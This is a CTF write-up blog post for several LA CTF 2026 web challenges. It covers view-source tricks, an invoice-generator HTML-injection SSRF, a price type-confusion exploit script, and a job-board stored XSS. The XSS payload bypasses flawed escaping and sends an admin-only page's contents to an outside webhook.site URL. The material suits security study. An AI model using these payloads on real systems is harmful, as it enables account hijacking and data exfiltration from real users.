@@ -1,0 +1,1024 @@
+---
+layout: post
+title:  "Web Challenges"
+date:   2026-02-08 23:00:00 -0400
+author: robo.uzi
+tags: [CTF]
+permalink: /lactf-2026-web-challenges/
+---
+* TOC
+{:toc}
+
+
+
+## mutation mutation
+
+**Category**: web
+
+**Author**: burturt
+
+**Description**: It's a free flag! You just gotta inspect the page to get it. Just be quick though... the flag is constantly mutating. Can you catch it before it changes? [mutation-mutation.chall.lac.tf](https://mutation-mutation.chall.lac.tf)
+
+I cant right click and inspect or do much so I just type `view-source:https://mutation-mutation.chall.lac.tf/` manually. Then I go to the debugger and pause all js execution. Then I can see the flag in the source code. 
+
+`lactf{с0nѕtаnt_mutаtі0n_1s_fun!_🧬_👋🏽_ІlІ1| ௌض픋ԡೇ∑ᦞ୞땾᥉༂↗ۑீ᤼യ⌃±❣Ӣ◼ௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌௌ}`
+
+___
+
+## the-trial
+
+**Category**: web
+
+**Author**: aplet123
+
+**Description**: I think the main takeaway from Kafka is that bureaucracy is bad? Or maybe it's that we live in a society. [the-trial.chall.lac.tf](https://the-trial.chall.lac.tf)
+
+Going to `view-source:https://the-trial.chall.lac.tf/` I see this script in the source code:
+```javascript
+< script >
+const val = document.getElementById("val");
+const disp = document.getElementById("disp");
+const forminp = document.getElementById("forminp");
+const submit = document.getElementById("submit");
+const lucky = document.getElementById("lucky");
+const msg = document.getElementById("msg");
+const cm = "kjzhcyprdolnbgusfiawtqmxev";
+
+function update() {
+    let s = "";
+    let n = val.value;
+    for (let i = 0; i < 4; i++) {
+        s += cm[n % cm.length];
+        n = Math.floor(n / cm.length);
+    }
+    if (disp.textContent !== s) {
+        disp.textContent = s;
+    }
+}
+setInterval(update, 10);
+submit.addEventListener("click", async () => {
+    const req = await fetch("/getflag", {
+        method: "POST",
+        body: `word=${encodeURIComponent(disp.textContent)}`,
+        headers: {
+            "Content-Type": "application/x-www-form-urlencoded"
+        }
+    });
+    msg.textContent = await req.text();
+});
+lucky.addEventListener("click", () => {
+    location.replace("https://www.youtube.com/watch?v=dQw4w9WgXcQ");
+});
+
+function bounce(ele) {
+    const t = [0, 0];
+    const v = [1, 1];
+    setInterval(() => {
+        t[0] += v[0];
+        t[1] += v[1];
+        ele.style.translate = `${t[0]}pt ${t[1]}pt`;
+        const pos = ele.getBoundingClientRect();
+        if (pos.right >= window.innerWidth) {
+            v[0] = -1;
+        } else if (pos.left <= 0) {
+            v[0] = 1;
+        }
+        if (pos.bottom >= window.innerHeight) {
+            v[1] = -1;
+        } else if (pos.top <= 0) {
+            v[1] = 1;
+        }
+    }, 20);
+}
+bounce(submit);
+bounce(lucky); < /script>
+```
+
+The JS continuously converts a slider value into a 4 letter string by interpreting the number in base-26 using a custom alphabet. This string is displayed on the page and submitted as the `word` parameter in a POST request to `/getflag`. Its a bunch of nonsense really. 
+
+Sending a random strings gets this response:
+```shell
+curl -X POST https://the-trial.chall.lac.tf/getflag -H "Content-Type: application/x-www-form-urlencoded" --data "word=xxxx"  
+You want the WHAT?
+```
+
+Sending the string displayed on the page gets this reponse:
+```shell
+curl -X POST https://the-trial.chall.lac.tf/getflag -H "Content-Type: application/x-www-form-urlencoded" --data "word=wqga"  
+Subscribe to LA CTF Premium for exclusive support.
+```
+
+I make this request to get the flag:
+```shell
+curl -X POST https://the-trial.chall.lac.tf/getflag -H "Content-Type: application/x-www-form-urlencoded" --data "word=flag"  
+Ah, you want the flag? Well here you go! lactf{gregor_samsa_awoke_from_wait_thats_the_wrong_book}
+```
+
+`lactf{gregor_samsa_awoke_from_wait_thats_the_wrong_book}`
+
+___
+
+## lactf-invoice-generator
+
+**Category**: web
+
+**Author**: AVDestroyer
+
+**Description**: I need an itemized list of everything purchased for LA CTF 2026.
+
+I get the challenge files for local testing:
+```shell
+tar -xvzf dist.tar.gz  
+flag/  
+flag/flag.js  
+flag/Dockerfile  
+invoice-generator/  
+invoice-generator/package-lock.json  
+invoice-generator/package.json  
+invoice-generator/server.js  
+invoice-generator/Dockerfile  
+invoice-generator/public/  
+invoice-generator/public/style.css  
+invoice-generator/public/index.html  
+docker-compose.yml
+```
+
+Contents of `server.js`:
+```shell
+const express = require("express");  
+const puppeteer = require("puppeteer");  
+const path = require("path");  
+  
+// Invoices  
+const app = express();  
+const PORT = 3000;  
+  
+// Middleware  
+app.use(express.static("public"));  
+app.use(express.urlencoded({ extended: false }));  
+app.use(express.json());  
+app.get("/", (req, res) => {  
+ res.sendFile(path.join(__dirname, "public", "index.html"));  
+});  
+  
+// Generate PDF invoice  
+app.post("/generate-invoice", async (req, res) => {  
+ try {  
+   const { name, item, cost, datePurchased } = req.body;  
+  
+   if (!name || !item || !cost || !datePurchased) {  
+     return res.status(400).send("All fields are required");  
+   }  
+  
+   const invoiceHTML = generateInvoiceHTML(  
+     name,  
+     item,  
+     parseFloat(cost),  
+     datePurchased,  
+   );  
+  
+   let browser;  
+   try {  
+     browser = await puppeteer.launch({  
+       headless: true,  
+       args: ["--js-flags=--jitless", "--incognito"],  
+     });  
+  
+     const page = await browser.newPage();  
+     await page.setViewport({ width: 821, height: 1159 });  
+     await page.setContent(invoiceHTML, { waitUntil: "load" });  
+  
+     const pdf = await page.pdf({  
+       format: "A4",  
+       printBackground: true,  
+       margin: 0,  
+     });  
+  
+     res.contentType("application/pdf");  
+     res.setHeader(  
+       "Content-Disposition",  
+       `attachment; filename="invoice-${Date.now()}.pdf"`,  
+     );  
+     res.end(pdf);  
+   } finally {  
+     if (browser) {  
+       await browser.close();  
+     }  
+   }  
+ } catch (error) {  
+   res.status(500).send("Error generating invoice");  
+ }  
+});  
+  
+function generateInvoiceHTML(name, item, cost, datePurchased) {  
+ const invoiceNumber = Math.floor(Math.random() * 100000)  
+   .toString()  
+   .padStart(6, "0");  
+ const currentDate = new Date().toLocaleDateString("en-US", {  
+   year: "numeric",  
+   month: "long",  
+   day: "numeric",  
+ });  
+  
+ return `  
+   <!DOCTYPE html>  
+   <html>  
+   <head>  
+     <meta charset="UTF-8">  
+     <title>Invoice</title>  
+     <style>  
+       body {  
+         font-family: Arial, sans-serif;  
+         max-width: 800px;  
+         margin: 0 auto;  
+         padding: 20px;  
+         color: #333;  
+       }  
+       .header {  
+         text-align: center;  
+         margin-bottom: 30px;  
+         border-bottom: 2px solid #333;  
+         padding-bottom: 20px;  
+       }  
+       .header h1 {  
+         margin: 0;  
+         font-size: 32px;  
+       }  
+       .invoice-details {  
+         display: flex;  
+         justify-content: space-between;  
+         margin-bottom: 30px;  
+         font-size: 14px;  
+       }  
+       .invoice-details div {  
+         flex: 1;  
+       }  
+       .invoice-details strong {  
+         display: block;  
+         margin-bottom: 5px;  
+       }  
+       .customer-info {  
+         margin-bottom: 30px;  
+         font-size: 14px;  
+       }  
+       .customer-info strong {  
+         display: block;  
+         margin-bottom: 5px;  
+       }  
+       table {  
+         width: 100%;  
+         border-collapse: collapse;  
+         margin-bottom: 30px;  
+       }  
+       table th {  
+         background-color: #f0f0f0;  
+         padding: 10px;  
+         text-align: left;  
+         border-bottom: 2px solid #333;  
+         font-weight: bold;  
+       }  
+       table td {  
+         padding: 10px;  
+         border-bottom: 1px solid #ddd;  
+       }  
+       .text-right {  
+         text-align: right;  
+       }  
+       .total-section {  
+         display: flex;  
+         justify-content: flex-end;  
+         margin-bottom: 30px;  
+       }  
+       .total-section div {  
+         width: 300px;  
+       }  
+       .total-row {  
+         display: flex;  
+         justify-content: space-between;  
+         padding: 8px 0;  
+         border-bottom: 1px solid #ddd;  
+       }  
+       .total-row.final {  
+         border: none;  
+         border-top: 2px solid #333;  
+         font-size: 18px;  
+         font-weight: bold;  
+         padding-top: 10px;  
+       }  
+       .footer {  
+         text-align: center;  
+         font-size: 12px;  
+         color: #666;  
+         margin-top: 30px;  
+         padding-top: 20px;  
+         border-top: 1px solid #ddd;  
+       }  
+     </style>  
+   </head>  
+   <body>  
+     <div class="header">  
+       <h1>INVOICE</h1>  
+     </div>  
+  
+     <div class="invoice-details">  
+       <div>  
+         <strong>Invoice Number:</strong>  
+         ${invoiceNumber}  
+       </div>  
+       <div>  
+         <strong>Invoice Date:</strong>  
+         ${currentDate}  
+       </div>  
+     </div>  
+  
+     <div class="customer-info">  
+       <strong>Bill To:</strong>  
+       ${name}  
+     </div>  
+  
+     <table>  
+       <thead>  
+         <tr>  
+           <th>Description</th>  
+           <th class="text-right">Unit Price</th>  
+           <th class="text-right">Quantity</th>  
+           <th class="text-right">Amount</th>  
+         </tr>  
+       </thead>  
+       <tbody>  
+         <tr>  
+           <td>${item}</td>  
+           <td class="text-right">$${cost.toFixed(2)}</td>  
+           <td class="text-right">1</td>  
+           <td class="text-right">$${cost.toFixed(2)}</td>  
+         </tr>  
+       </tbody>  
+     </table>  
+  
+     <div class="total-section">  
+       <div>  
+         <div class="total-row">  
+           <span>Subtotal:</span>  
+           <span>$${cost.toFixed(2)}</span>  
+         </div>  
+         <div class="total-row">  
+           <span>Tax (0%):</span>  
+           <span>$0.00</span>  
+         </div>  
+         <div class="total-row final">  
+           <span>Total:</span>  
+           <span>$${cost.toFixed(2)}</span>  
+         </div>  
+       </div>  
+     </div>  
+  
+     <div class="customer-info">  
+       <strong>Date Purchased:</strong>  
+       ${datePurchased}  
+     </div>  
+  
+     <div class="footer">  
+       <p>Thank you for your purchase!</p>  
+     </div>  
+   </body>  
+   </html>  
+ `;  
+}  
+  
+// Start server  
+app.listen(PORT, () => {  
+ console.log(`Invoice generator running on http://localhost:${PORT}`);  
+});
+```
+
+Contents of `flag.js`:
+```shell
+const http = require("http");  
+  
+const FLAG = process.env.FLAG || "lactf{fake_flag}";  
+const PORT = 8081;  
+  
+const server = http.createServer((req, res) => {  
+ if (req.method === "GET" && req.url === "/flag") {  
+   res.writeHead(200, { "Content-Type": "text/html" });  
+   res.end(`<div><strong>FLAG:</strong> ${FLAG}</div>`);  
+   return;  
+ }  
+ res.writeHead(404, { "Content-Type": "text/plain" });  
+ res.end("Not found");  
+});  
+  
+server.listen(PORT, () => {  
+ console.log(`Flag service running on port ${PORT}`);  
+});
+```
+
+The input from the user is not sanitized! It is then directly embedded into the HTML. The HTML is rendered server side using Puppeteers `page.setContent()` which causes chromium (the invoice generator uses Puppeteer, which launches a bundled headless chromium browser I come to find out) to fetch external resources during rendering. Since the invoice generator container shares a docker network with the internal flag service, a injected HTML element can trigger server side requests to the internal endpoint. The response is rendered into the generated PDF. This results in a server side HTML injection leading to SSRF.
+
+I generate a PDF like this:
+
+![Alt text](/images/Screenshot at 2026-02-06 23-14-41.png)
+
+The generated PDF contains the flag:
+
+![Alt text](/images/Screenshot at 2026-02-06 23-17-48.png)
+
+`lactf{plz_s4n1t1z3_y0ur_purch4s3_l1st}`
+
+___
+
+## narnes-and-bobles
+
+**Category**: web
+
+**Author**: r2uwu2
+
+**Description**: I heard Amazon killed a certain book store so I'm gonna make my own book store and kill Amazon. I dove deep and delivered results.
+
+The main logic for the site is in `server.js` and `main.js`. Contents of `server.js:
+```shell
+import express from 'express';  
+import cookieParser from 'cookie-parser';  
+import { SQL } from 'bun';  
+import books from './books.json';  
+import { createMemoryArchive, CompressionLevel } from 'zip-bun';  
+  
+const app = express();  
+const port = 3000;  
+  
+const INITIAL_BALANCE = 1000;  
+  
+const db = new SQL('sqlite://:memory:');  
+  
+await db`  
+CREATE TABLE users (  
+ username TEXT,  
+ password_hash TEXT,  
+ balance INT,  
+  
+ PRIMARY KEY (username)  
+);  
+  
+CREATE TABLE sessions (  
+ id TEXT,  
+ userid TEXT,  
+  
+ PRIMARY KEY (id)  
+ FOREIGN KEY (userid) REFERENCES users(username)  
+);  
+  
+CREATE TABLE books (  
+ id TEXT,  
+ title TEXT,  
+ file TEXT,  
+ price INT,  
+  
+ PRIMARY KEY (id)  
+);  
+  
+CREATE TABLE cart_items (  
+ username TEXT,  
+ book_id TEXT,  
+ is_sample INT,  
+  
+ FOREIGN KEY (username) REFERENCES users(username)  
+ FOREIGN KEY (book_id) REFERENCES books(id)  
+);  
+CREATE INDEX idx_cart_items_username ON cart_items(username);  
+`;  
+await db`INSERT INTO books ${db(books)}`;  
+  
+const booksLookup = new Map();  
+for (const book of books) {  
+ booksLookup.set(book.id, book);  
+};  
+  
+app.use(cookieParser());  
+app.use(express.json());  
+app.use(express.urlencoded({ extended: true }));  
+  
+const needsAuth = async (req, res, next) => {  
+ if (typeof req.cookies.session === 'string') {  
+   const sessions = await db`SELECT userid FROM sessions WHERE id=${req.cookies.session}`;  
+   if (sessions.length > 0) {  
+     res.locals.username = sessions[0].userid;  
+   }  
+ }  
+  
+ if (!res.locals.username) {  
+   return res.redirect('/login');  
+ }  
+ next();  
+};  
+  
+app.get('/', needsAuth);  
+  
+app.use(express.static('site'));  
+  
+app.post('/login', async (req, res) => {  
+ const { username, password } = req.body;  
+ if (typeof username !== 'string' || typeof password !== 'string') {  
+   return res.send('please provide a username/password');  
+ }  
+ const potentialUsers = await db`SELECT * FROM users WHERE username=${username}`;  
+ if (potentialUsers.length === 0) {  
+   return res.send('user does not exist, try registering first');  
+ }  
+ if (!(await Bun.password.verify(password, potentialUsers[0].password_hash))) {  
+   return res.send('invalid password');  
+ }  
+ const sessionId = Bun.randomUUIDv7();  
+ const session = { id: sessionId, userid: username };  
+ await db`INSERT INTO sessions ${db(session)}`;  
+ res.cookie('session', sessionId);  
+ res.redirect('/');  
+});  
+  
+app.post('/register', async (req, res) => {  
+ const { username, password } = req.body;  
+ if (typeof username !== 'string' || typeof password !== 'string') {  
+   return res.send('please provide a username/password');  
+ }  
+ const potentialUsers = await db`SELECT * FROM users WHERE username=${username}`;  
+ if (potentialUsers.length > 0) {  
+   return res.send('user already exists');  
+ }  
+ const password_hash = await Bun.password.hash(password);  
+ const user = { username, password_hash, balance: INITIAL_BALANCE };  
+ await db`INSERT INTO users ${db(user)}`;  
+  
+ const sessionId = Bun.randomUUIDv7();  
+ const session = { id: sessionId, userid: username };  
+ await db`INSERT INTO sessions ${db(session)}`;  
+ res.cookie('session', sessionId);  
+ res.redirect('/');  
+});  
+  
+app.get('/cart', needsAuth, async (req, res) => {  
+ res.json({  
+   cart: await db`SELECT book_id, is_sample FROM cart_items WHERE username=${res.locals.username}`,  
+   balance: (await db`SELECT balance FROM users WHERE username=${res.locals.username}`)[0].balance  
+ });  
+});  
+  
+app.post('/cart/add', needsAuth, async (req, res) => {  
+ const productsToAdd = req.body.products;  
+ if (!Array.isArray(productsToAdd) || productsToAdd.length === 0) {  
+   return res.json({ err: 'please add a product to cart' });  
+ }  
+  
+ const [{ balance }] = await db`SELECT balance FROM users WHERE username=${res.locals.username}`;  
+ const [{ cartSum }] = await db`  
+   SELECT SUM(books.price) AS cartSum  
+   FROM cart_items  
+   JOIN books ON books.id = cart_items.book_id  
+   WHERE cart_items.username = ${res.locals.username} AND cart_items.is_sample = 0  
+ `;  
+ const additionalSum = productsToAdd  
+   .filter((product) => !+product.is_sample)  
+   .map((product) => booksLookup.get(product.book_id).price ?? 99999999)  
+   .reduce((l, r) => l + r, 0);  
+  
+ if (additionalSum + cartSum > balance) {  
+   return res.json({ err: 'too poor, have you considered geting more money?' })  
+ }  
+ const cartEntries = productsToAdd.map((prod) => ({ ...prod, username: res.locals.username }));  
+ await db`INSERT INTO cart_items ${db(cartEntries)}`;  
+ res.json({ remainingBalance: balance - cartSum - additionalSum });  
+});  
+  
+app.post('/cart/checkout', needsAuth, async (req, res) => {  
+ const cart = await db`SELECT * FROM cart_items WHERE username=${res.locals.username}`;  
+ const [{ balance }] = await db`SELECT balance FROM users WHERE username=${res.locals.username}`;  
+ const cartSum = cart  
+   .filter((item) => !+item.is_sample)  
+   .map((item) => booksLookup.get(item.book_id).price)  
+   .reduce((l, r) => l + r, 0);  
+  
+ await db`UPDATE users SET balance=${balance - cartSum} WHERE username = ${res.locals.username}`;  
+ await db`DELETE FROM cart_items WHERE username=${res.locals.username}`;  
+  
+ const zipWriter = createMemoryArchive();  
+ await Promise.all(cart.map(async (item) => {  
+   const book = booksLookup.get(item.book_id);  
+   const path = item.is_sample ? book.file.replace(/\.([^.]+)$/, '_sample.$1') : book.file;  
+   const content = await Bun.file('books/' + path).bytes();  
+   zipWriter.addFile(path, content, CompressionLevel.NO_COMPRESSION);  
+ }));  
+ const zipData = zipWriter.finalizeToMemory();  
+ res.setHeader('Content-Type', 'application/zip');  
+ res.setHeader('Content-Disposition', 'attachment; filename="narns-bobles-order.zip"');  
+ res.send(Buffer.from(zipData));  
+});  
+  
+app.listen(port, () => {  
+ console.log(`Listening on http://localhost:${port}...`);  
+});
+```
+
+Contents of `main.js`:
+```shell
+const books = [  
+ {"id":"a3e33c2505a19d18","title":"The Part-Time Parliament","file":"part-time-parliament.pdf","price":"10"},  
+ {"id":"509d8c2a80e495fb","title":"The End of Cryptography","file":"end_of_cryptography.txt","price":20},  
+ {"id":"f4838abd731caf29","title":"AVDestroyer Origin Lore","file":"avd_origin_lore.txt","price":40},  
+ {"id":"2a16e349fb9045fa","title":"Flag","file":"flag.txt","price":1000000}  
+];  
+  
+const balanceEl = document.getElementById('balance');  
+const cartList = document.getElementById('cart-list');  
+const booksContainer = document.getElementById('books-container');  
+const checkoutForm = document.getElementById('checkout-form');  
+  
+// Fetch /cart on load  
+async function loadCart() {  
+ try {  
+   const res = await fetch('/cart');  
+   const data = await res.json();  
+   balanceEl.textContent = data.balance;  
+  
+   cartList.innerHTML = '';  
+   data.cart.forEach(item => {  
+     const book = books.find(b => b.id === item.book_id);  
+     if (book) {  
+       const li = document.createElement('li');  
+       li.textContent = `${book.title} ${item.is_sample ? '(Sample)' : ''}`;  
+       cartList.appendChild(li);  
+     }  
+   });  
+ } catch (err) {  
+   console.error('Error loading cart', err);  
+ }  
+}  
+  
+// Render book buttons  
+function renderBooks() {  
+ books.forEach(book => {  
+   const card = document.createElement('div');  
+   card.className = 'book-card';  
+  
+   card.innerHTML = `  
+     <img src="/thumbnails/${book.id}.webp" alt="${book.title}">  
+     <div>${book.title}</div>  
+     <div>$${book.price}</div>  
+     <button data-id="${book.id}">Add Sample</button>  
+     <button data-id="${book.id}">Add to Cart</button>  
+   `;  
+  
+   booksContainer.appendChild(card);  
+ });  
+}  
+  
+// Add to cart  
+booksContainer.addEventListener('click', async (e) => {  
+ if (e.target.tagName === 'BUTTON') {  
+   const bookId = e.target.getAttribute('data-id');  
+   const isSample = e.target.textContent.toLowerCase().includes('sample');  
+   try {  
+     const res = await fetch('/cart/add', {  
+       method: 'POST',  
+       headers: { 'Content-Type': 'application/json' },  
+       body: JSON.stringify({ products: [{ book_id: bookId, is_sample: isSample }] })  
+     });  
+     const data = await res.json();  
+     if (data.err) {  
+       alert(`Error: ${data.err}`);  
+     } else {  
+       balanceEl.textContent = data.remainingBalance;  
+       loadCart();  
+     }  
+   } catch (err) {  
+     console.error('Error adding to cart', err);  
+   }  
+ }  
+});  
+  
+checkoutForm.addEventListener('submit', async () => {  
+ const start = Date.now();  
+ while (Date.now() - start < 2000) {  
+   await new Promise(res => setTimeout(res, 500));  
+   await loadCart();  
+ }  
+});  
+  
+// Initialize  
+renderBooks();  
+loadCart();
+```
+
+From `main.js` I can see the price for the cheapest book is a string (`"10"`). The price for the flag is an integer (`1000000`). You start with `1000` dollars. 
+
+I login to the site:
+
+![Alt text](/images/narnes-and-bobles.png)
+
+In `/cart/add` the javascript switches to string concatenation if any operand is a string:
+```javascript
+.reduce((l, r) => l + r, 0);
+```
+In JS the `+` operator performs string concatenation if either operand is a string so once a string valued price is introduced, the entire sum becomes a string. It's also worth mentioning this validates the total price of all products in the request at once, rather than each item individually. This allows the cheap "string priced" book to poison the calculation and carry the flag through the same request.
+
+Exploit script:
+```python
+import requests
+
+BASE = "https://narnes-and-bobles-z61q7.instancer.lac.tf"
+STRING_BOOK = "a3e33c2505a19d18"
+FLAG_BOOK   = "2a16e349fb9045fa"
+s = requests.Session()
+
+# register
+s.post(
+    f"{BASE}/register",
+    data={"username": "logic", "password": "logic"},
+)
+
+# single malicious add
+r = s.post(
+    f"{BASE}/cart/add",
+    json={
+        "products": [
+            {"book_id": STRING_BOOK, "is_sample": 0},
+            {"book_id": FLAG_BOOK, "is_sample": 0},
+        ]
+    },
+)
+
+print("add:", r.text)
+
+# checkout
+r = s.post(f"{BASE}/cart/checkout")
+
+open("loot.zip", "wb").write(r.content)
+print("saved loot.zip")
+
+```
+
+Run the script:
+```shell
+python3 exploit.py  
+add: {"remainingBalance":-100999000}  
+saved loot.zip
+```
+
+The zip contains the flag:
+```shell
+unzip loot.zip  
+Archive:  loot.zip  
+extracting: flag.txt                   
+extracting: part-time-parliament.pdf
+
+cat flag.txt  
+lactf{matcha_dubai_chocolate_labubu}
+```
+
+The vulnerability is caused by inconsistent typing of book prices (strings vs integer), leading to javascript string concatenation when calculating the total in `/cart/add`, which bypasses the balance check and allows purchasing the flag in a single request.
+
+`lactf{matcha_dubai_chocolate_labubu}`
+
+___
+
+## job-board
+
+**Category**: web
+
+**Author**: r2uwu2
+
+**Description**: I heard you were looking for a job. Too bad the one that gives you the secret flag is private. [job-board.chall.lac.tf](https://job-board.chall.lac.tf)
+
+Note - Send your job application to the [Admin Recruiter](https://admin-bot.lac.tf/job-board) (`https://admin-bot.lac.tf/job-board`) to view.
+
+I get the source code to the site. Contents of `admin-bot.js`:
+```shell
+module.exports = {  
+   name: "job-board",  
+   async execute(browser, url) {  
+       const page = await browser.newPage();  
+  
+       // login as admin recruiter  
+       await page.goto(process.env.CHALL_JOB_BOARD_URL + '/login');  
+       await page.waitForSelector('[name=username]');  
+       await page.type('[name=username]', 'admin');  
+       await page.type('[name=password]', process.env.CHALL_JOB_BOARD_PASSWORD);  
+       await page.click('[type=submit]');  
+       await page.waitForNavigation();  
+  
+       // now visit the job application applicant sends over  
+       await page.goto(url);  
+       await page.waitForNetworkIdle({  
+           timeout: 5000,  
+       });  
+       await page.close();  
+   },  
+};
+```
+
+Contents of `app.js`:
+```shell
+const express = require('express');  
+const cookieParser = require('cookie-parser');  
+const crypto = require('crypto');  
+const fs = require('fs');  
+  
+const ADMINPW = process.env.ADMINPW ?? crypto.randomBytes(16).toString('hex');  
+const FLAG = process.env.FLAG ?? 'lactf{test_flag}';  
+  
+const app = express();  
+const recruiters = new Map();  
+const jobs = new Map();  
+const applications = new Map();  
+const sessions = new Map();  
+const landingPageTemplate = () => fs.readFileSync('site/index.html').toString();  
+const jobTemplate = () => fs.readFileSync('site/job.html').toString();  
+const appliedTemplate = () => fs.readFileSync('site/applied.html').toString();  
+const applicationTemplate = () => fs.readFileSync('site/application.html').toString();  
+  
+// js translation of python's html.escape because  
+// this isn't in nodejs stdlib i think  
+// src - https://github.com/python/cpython/blob/18347417b06d09fa7eeac68f88eb1e720e925c65/Lib/html/__init__.py£L12  
+function htmlEscape(s, quote=true) {  
+ s = s.replace("&", "&amp;"); // Must be done first!  
+ s = s.replace("<", "&lt;");  
+ s = s.replace(">", "&gt;");  
+ if (quote) {  
+   s = s.replace('"', "&quot;");  
+   s = s.replace('\'', "&£x27;");  
+ }  
+ return s;  
+}  
+  
+const emailRegex = /^[A-Za-z0-9._%+-]+@[A-Za-z0-9.-]+\.[A-Za-z]{2,}$/;  
+  
+function stringMinLen(s, len) {  
+ return typeof s === 'string' && s.length >= len;  
+}  
+  
+function createRecruiter(username, password, name) {  
+ const recruiter = { username, password, name, jobs: [] };  
+ recruiters.set(recruiter.username, recruiter);  
+ return recruiter;  
+}  
+  
+function createJob(title, description, recruiter) {  
+ const id = crypto.randomUUID();  
+ jobs.set(id, { id, title, description, recruiter });  
+ return id;  
+}  
+  
+const privateJobs = [];  
+const publicJobs = [];  
+  
+// create the initial jobs  
+(() => {  
+ const recruiter = createRecruiter(  
+   'admin', ADMINPW, 'Admin McAdmin'  
+ );  
+ privateJobs.push(createJob('Flag Haver', `You keep the flag safe (${FLAG}). This is an internal job, not meant for the public.`, recruiter));  
+ publicJobs.push(createJob('Junior CTFer', 'Solve this challenge and join a team', recruiter));  
+ publicJobs.push(createJob('Senior CTFer', 'Solve all the challenges and join our team', recruiter));  
+})();  
+  
+function isRecruiter(req) {  
+ if ('session' in req.cookies) {  
+   const recruiter = sessions.get(req.cookies.session);  
+   return Boolean(recruiter);  
+ }  
+ return false;  
+}  
+  
+app.use(express.urlencoded({ extended: true }));  
+app.use(cookieParser());  
+  
+app.get('/', (req, res) => {  
+ let jobList = publicJobs  
+   .map(jobId => `<li><a href="/job/${jobId}">${jobs.get(jobId).title}</a></li>`)  
+   .join('\n');  
+ if (isRecruiter(req)) {  
+   jobList += privateJobs  
+     .map(jobId => `<li><a href="/job/${jobId}">${jobs.get(jobId).title}</a></li>`)  
+     .join('\n');  
+ }  
+ return res.send(landingPageTemplate()  
+   .replace('JOBLIST', jobList)  
+ );  
+});  
+  
+app.get('/job/:id', (req, res) => {  
+ const job = jobs.get(req.params.id);  
+ if (!job) {  
+   return res.send('not found');  
+ }  
+ return res.send(jobTemplate()  
+   .replace('TITLE', htmlEscape(job.title))  
+   .replace('DESCRIPTION', htmlEscape(job.description))  
+   .replace('URL', htmlEscape(`/application/${req.params.id}`))  
+ );  
+});  
+  
+app.post('/application/:id', (req, res) => {  
+ const job = jobs.get(req.params.id);  
+ if (!job) return res.send('job not found');  
+ const { name, email, why } = req.body;  
+ const applicationId = crypto.randomUUID();  
+ const application = { id: applicationId, name, email, why };  
+ if (![name, email, why].every((field) => stringMinLen(field, 3))) {  
+   return res.send('incomplete job application');  
+ }  
+ if (!emailRegex.test(email)) {  
+   return res.send('invalid email in job application');  
+ }  
+ applications.set(applicationId, application);  
+ return res.send(appliedTemplate()  
+   .replace('NAME', htmlEscape(name))  
+   .replace('EMAIL', htmlEscape(email))  
+   .replace('URL', htmlEscape(`/application/${applicationId}`))  
+ );  
+});  
+  
+app.get('/application/:id', (req, res) => {  
+ const application = applications.get(req.params.id);  
+ if (!application) return res.send('application not found');  
+ const { name, email, why } = application;  
+ return res.send(applicationTemplate()  
+   .replace('NAME', htmlEscape(name))  
+   .replace('EMAIL', htmlEscape(email))  
+   .replace('WHY', htmlEscape(why))  
+ );  
+});  
+  
+// only for admin, not for you!  
+app.post('/login', (req, res) => {  
+ const { username, password } = req.body;  
+ if ([username, password].some(field => !stringMinLen(field, 0))) {  
+   return res.redirect('/login?err=' + encodeURIComponent('please fill out all fields'));  
+ }  
+ if (!recruiters.has(username)) {  
+   return res.redirect('/login?err=' + encodeURIComponent('username does not exist'));  
+ }  
+ const recruiter = recruiters.get(username);  
+ if (recruiter.password !== password) {  
+   return res.redirect('/login?err=' + encodeURIComponent('incorrect credentials'));  
+ }  
+ const sessionId = crypto.randomUUID();  
+ sessions.set(sessionId, recruiter);  
+ return res  
+   .cookie('session', sessionId)  
+   .redirect('/');  
+});  
+  
+app.use(express.static('site/'));  
+  
+app.listen(3000, () => {  
+ console.log('Listening on http://localhost:3000');  
+});
+```
+
+From `app.js` I can see they are trying to escape certain special characters. However this code only escapes the first occurance of those characters:
+```shell
+function htmlEscape(s, quote=true) {  
+ s = s.replace("&", "&amp;"); // Must be done first!  
+ s = s.replace("<", "&lt;");  
+ s = s.replace(">", "&gt;");  
+ if (quote) {  
+   s = s.replace('"', "&quot;");  
+   s = s.replace('\'', "&£x27;");  
+ }  
+ return s;  
+}  
+```
+
+I can begin my XSS payload with `'<>&\'"` to consume the first escaping pass the app makes. 
+
+Stored XSS payload targeting the `Flag Haver` job:
+```javascript
+'<>&\'"<script>fetch("/").then(r=>r.text()).then(t=>{const d=new DOMParser().parseFromString(t,"text/html");let u;Array.from(d.querySelectorAll(".joblist a")).forEach(a=>{if(a.textContent==="Flag Haver")u=a.href});if(u)fetch(u).then(r=>r.text()).then(j=>{const e=new DOMParser().parseFromString(j,"text/html").querySelector("p").textContent;fetch(`https://webhook.site/f82c1e14-cd40-41b3-8585-1b72178d44e4/?f=${encodeURIComponent(e)}`)})})</script>
+```
+
+I also tried this payload which also worked just because its a bit easier to read:
+```js
+'<>&\'"<script>
+fetch("/")
+  .then(r => r.text())
+  .then(t => {
+    const d = new DOMParser().parseFromString(t, "text/html");
+    const u = [...d.querySelectorAll(".joblist a")]
+      .find(a => a.textContent === "Flag Haver")?.href;
+    if (u) fetch(u)
+      .then(r => r.text())
+      .then(j => {
+        const e = new DOMParser().parseFromString(j, "text/html")
+          .querySelector("p").textContent;
+        fetch(`https://webhook.site/f82c1e14-cd40-41b3-8585-1b72178d44e4/?f=${encodeURIComponent(e)}`);
+      });
+  });
+</script>
+```
+
+Submit a job application for a Junior CTFer and enter the payload into the `Why/Bio/Resume` section. I send my generated application link to the admin bot. The admin bot logs in as the admin recruiter before visiting the submitted URL, meaning any JS executed on the page runs with an authenticated admin session cookie. Back on [webhook.site](webhook.site) I see this request is made to my webhook:
+```url
+https://webhook.site/f82c1e14-cd40-41b3-8585-1b72178d44e4/?f=You%20keep%20the%20flag%20safe%20(lactf%7Bc0ngr4ts_0n_y0ur_n3w_l7fe%7D).%20This%20is%20an%20internal%20job%2C%20not%20meant%20for%20the%20public.
+```
+
+`lactf{c0ngr4ts_0n_y0ur_n3w_l7fe}`
+
+___
